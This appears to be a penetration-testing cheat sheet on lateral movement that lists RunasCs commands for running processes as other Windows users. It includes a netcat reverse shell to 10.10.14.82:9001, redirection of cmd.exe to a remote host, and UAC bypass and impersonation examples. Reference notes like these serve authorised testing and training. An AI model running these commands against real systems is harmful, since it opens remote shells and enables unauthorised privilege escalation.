 


### [RunasCs](OffSec-Notes-main/Playbook/11%20Windows/0%20Lateral%20Movement/RunasCs.md)

```powershell
# Run a command as a local user
.\RunasCs.exe user1 password1 "cmd /c whoami /all"

# Run a command as a domain user and logon type as NetworkCleartext (8)
.\RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8

# Run a background process as a local user,
.\RunasCs.exe user1 password1 "C:\Temp\nc.exe 10.10.14.82 9001 -e cmd.exe" -t 0

# Redirect stdin, stdout and stderr of the specified command to a remote host
.\RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444

# Run a command simulating the /netonly flag of runas.exe
.\RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9

# Run a command as an Administrator bypassing UAC
.\RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac

# Run a command as an Administrator through remote impersonation
.\RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```
